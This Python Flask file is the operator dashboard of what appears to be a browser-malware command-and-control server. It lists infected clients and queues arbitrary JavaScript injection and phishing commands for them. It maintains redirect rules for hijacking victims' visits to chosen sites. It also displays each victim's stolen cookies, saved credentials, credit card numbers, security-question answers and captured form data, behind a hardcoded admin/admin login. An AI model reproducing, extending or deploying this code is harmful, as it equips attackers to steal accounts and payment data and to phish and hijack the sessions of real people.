import eventlet
eventlet.monkey_patch()
from flask import Flask, render_template, request, redirect, url_for
from .forms import LoginForm
from flask_login import logout_user, login_user, login_required, LoginManager, UserMixin
from . import database, app
from .app import app as app_flask, socketio
from flask_socketio import SocketIO, emit
import json

login_manager = LoginManager()
login_manager.init_app(app_flask)
login_manager.login_view = 'login'
active_users = None


# user class not really sensible because only one attacker but necessary for implementing login
class User(UserMixin):
    def __init__(self, id):
        self.id = id

    def repr(self):
        return "admin"



@login_manager.user_loader
def load_user(userid):
    return User(userid)


@app_flask.route('/', methods=['GET', 'POST'])
def login():
    form = LoginForm()
    error = None

    if form.validate_on_submit():
        if request.form['username'] =='admin' and request.form['password'] == 'admin':
            user = User("admin")
            login_user(user)
            return redirect(url_for('attack_mode'))
        error = 'Invalid Credentials. Please try again.'
    return render_template('login.html', title='Log In', form=form, error=error)


@app_flask.route('/attackmode', methods=['GET', 'POST'])
@login_required
def attack_mode():
    conn = database.getConn()
    with conn.cursor() as cur:
        cur.execute("SELECT * FROM Client")
        data = cur.fetchall()
        conn.close()
    active_users = [i[0] for i in app.connected_clients]
    return render_template('index2.html', data=data, active_users=active_users)

@app_flask.route('/getBlacklist', methods=['POST'])
@login_required
def blacklist():
    conn = database.getConn()
    with conn.cursor() as cur:
        cur.execute('SELECT * FROM BlacklistedWebsites')
        blacklist = cur.fetchall()
    return render_template('blacklistedwebsites.html', blacklist=blacklist)


@app_flask.route('/blacklist', methods=['POST'])
@login_required
def handleBlacklist():
    url = request.form['url']
    redirect_url = request.form['redirect_url']
    addDelete = request.form['add']
    if(addDelete=='true'):
        database.store_blacklisted_website(url, redirect_url)
        return 'add'
    else:
        database.delete_blacklisted_website(url,redirect_url)
        return 'delete'


@app_flask.route('/update', methods=['POST'])
@login_required
def update():
    return redirect(url_for('attack_mode'))


# logout
@app_flask.route("/logout", methods=['POST'])
@login_required
def logout():
    logout_user()
    return redirect(url_for('login', next=request.endpoint))

@app_flask.route('/sendFormIDMappings', methods=['POST'])
@login_required
def sendFormIDMappings():
    url = request.form['url_for_mapping']
    mapping = request.form['mappings']
    #updateFormMappings(url, mapping)
    return '' + url + mapping

@app_flask.route('/sendjs', methods=['POST'])
@login_required
def sendjs():
    a = request.form['js']
    b = request.form['id']
    z = request.form['pattern']
    c = a + '\n' + b + '\n' + z
    database.add_js_cmd(b, z, a)
    return c

@app_flask.route('/formTest', methods=['POST'])
@login_required
def testingForm():
    return 'hi'

@app_flask.route('/phish', methods=['POST'])
@login_required
def phish():
    d = request.form['id']
    e = request.form['number']
    y = request.form['pattern']
    f = d + '\n' + e + '\n' + y
    database.add_phish_cmd(d, y, e)
    return f

@app_flask.route('/getinfo', methods=['POST'])
@login_required
def getinfo():
    userid = int(request.form['id'])
    fullbh = request.form['fullbh']
    conn = database.getConn()
    with conn.cursor() as cur:
        cur.execute('SELECT * FROM Client WHERE ID = (%s)', (userid,))
        record = cur.fetchone()
        cur.execute('SELECT * FROM Cookies WHERE CID = (%s)', (userid,))
        cookies = cur.fetchall()
        cur.execute('SELECT * FROM Credentials WHERE CID = (%s)', (userid,))
        credentials = cur.fetchall()
        cur.execute('SELECT * FROM CreditCard WHERE CID = (%s)', (userid,))
        creditcards = cur.fetchall()
        cur.execute('SELECT * FROM SecurityQuestions WHERE CID = (%s)', (userid,))
        questions = cur.fetchall()
        cur.execute('SELECT * FROM ComplexForms WHERE CID = (%s)', (userid,))
        forms = cur.fetchall()
        cur.execute('SELECT COLUMN_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = (%s) AND COLUMN_NAME = (%s)', ('FormIDMappings','LocalDef'))
        mappings = cur.fetchall()
        conn.close()
    form_urls = [i[2] for i in forms]
    forms = [i[1] for i in forms]
    # forms = [i.split(', ') for i in forms]
    forms = [json.loads(a) for a in forms]
    # j=0
    # for i in forms:
    #     forms[j] = [data[0] for data in i]
    #     j=j+1
    keys = [list(i.keys()) for i in forms]
    values = [list(i.values()) for i in forms]




    mappings = mappings.__str__()
    mappings=mappings[8:-6]
    mappings = mappings.replace("'","")
    mappings = mappings.split(',')
        # head = "url1\nurl2\nurl3\nurl4\nurl5\nurl6\nurl7\nurl8\nurl9\nurl10"
    # sites = head.split('\n')
    sites_in_html = []
    # for x in sites:
    #     sites_in_html.append(x)

    # browser_history = database.get_history(userid)
    # with open(browser_history) as bh:
    #     head = [next(bh) for x in range(10)]

    return render_template('result.html', data=record, cookies=cookies, credentials=credentials,
                           creditcards=creditcards, questions=questions, history = sites_in_html, fullbh = fullbh, forms = forms,
                           keys = keys, values = values, mappings =mappings,
                            urls = form_urls)

#
# def update_payload(id, text):
#     conn = database.getConn()
#     with conn.cursor() as cur:
#         cur.execute("UPDATE Client SET NextPayload = concat(NextPayload, (%s), '\n') WHERE ID = (%s)", (text, id))
#         conn.close()
#
# def check_status(user):
#     active_users = [i[0] for i in app.connected_clients]
#     if (active_users.__contains__(user)):
#         return True
#     return False


if __name__ == '__main__':
    socketio.run(app_flask, debug=True)
